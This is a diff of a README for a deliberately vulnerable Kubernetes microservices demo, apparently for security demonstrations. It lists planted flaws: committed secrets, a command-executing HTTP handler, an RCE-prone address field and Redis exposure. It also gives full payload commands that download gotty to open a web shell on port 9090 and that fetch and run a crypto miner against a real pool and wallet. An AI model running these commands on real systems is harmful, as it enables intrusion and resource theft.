@@ -3,14 +3,14 @@
 The **Online Boutique** cloud-native microservices demo application is tweaked to accommodate some of the use-cases mentioned below
 
 1. **Sensitive keys in codebases** -
-     [committing sensitive information to the version control system.](https://github.com/vsk-coding/microservices-demo/blob/main/UPDATES.md#sensitive-data-exposure)
+     [committing sensitive information to the version control system.](https://github.com/accuknox/samples/blob/main/microservice-demo/UPDATES.md#sensitive-data-exposure)
 
 2. **Custom handle with code execution** -
-    [a custom httpHandler to reply *whoami*](https://github.com/vsk-coding/microservices-demo/blob/main/UPDATES.md#custom-handle)
+    [a custom httpHandler to reply *whoami*](https://github.com/accuknox/samples/blob/main/microservice-demo/UPDATES.md#custom-handle)
 3. **Vulnerable address field** - 
-    [to executes codes in the backend](https://github.com/vsk-coding/microservices-demo/blob/main/UPDATES.md#rce)
-4. **Crypto Miner on pod** - [to install cryptominer python based application on to a pod](https://github.com/vsk-coding/microservices-demo/blob/main/UPDATES.md#crypto-miner)
-5. **Redis data exposure** - [to connect and disclose the data stored in redis db](https://github.com/vsk-coding/microservices-demo/blob/main/UPDATES.md#redis-data-exposure)
+    [to executes codes in the backend](https://github.com/accuknox/samples/blob/main/microservice-demo/UPDATES.md#rce)
+4. **Crypto Miner on pod** - [to install cryptominer python based application on to a pod](https://github.com/accuknox/samples/blob/main/microservice-demo/UPDATES.md#crypto-miner)
+5. **Redis data exposure** - [to connect and disclose the data stored in redis db](https://github.com/accuknox/samples/blob/main/microservice-demo/UPDATES.md#redis-data-exposure)
 
 
 > **Note:** These tweakings were done to make the application
@@ -33,8 +33,9 @@ kubectl create ns poc
 ```
 kubectl apply -f ./release/kubernetes-manifests.yaml -n poc
 ```
+OR
 ```
-kubectl -n poc apply -f https://raw.githubusercontent.com/vsk-coding/microservices-demo/master/release/kubernetes-manifests.yaml
+kubectl -n poc apply -f https://raw.githubusercontent.com/accuknox/samples/main/microservice-demo/release/kubernetes-manifests.yaml
 ```
 
 
@@ -68,7 +69,7 @@ http://localhost/cmd/whoami
 *Command*
 
 ```
-wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz && tar -xvzf gotty_linux_amd64.tar.gz && mv gotty /usr/local/bin/gotty && apk add libc6-compat && gotty -w --port 9090 sh
+apt update && apt install -y wget && wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz && tar -xvzf gotty_linux_amd64.tar.gz && mv gotty /usr/local/bin/gotty && gotty -w --port 9090 sh
 ```
 **Checkout Page** [![Screenshot of checkout page](./images/address.png)](./images/address.png) 
 
@@ -80,7 +81,7 @@ wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.t
 *Command*
 
 ```
-apk add --no-cache wget curl python2 && curl -L https://github.com/ricmoo/nightminer/archive/refs/heads/master.zip > test.zip && unzip test.zip && cd nightminer-master && python nightminer.py -o stratum+tcp://eu.miningdao.io:4444  -u 1LNdGsYtZXWeiKjGba7T997qvzrWqLXLma 
+apt update && apt install -y wget curl python2 && curl -L https://github.com/ricmoo/nightminer/archive/refs/heads/master.zip > test.zip && unzip test.zip && cd nightminer-master && python nightminer.py -o stratum+tcp://eu.miningdao.io:4444  -u 1LNdGsYtZXWeiKjGba7T997qvzrWqLXLma 
 ```
 
 [![Screenshot of hubble ui](./images/connection-hubble.png)](./images/connection-hubble.png) 
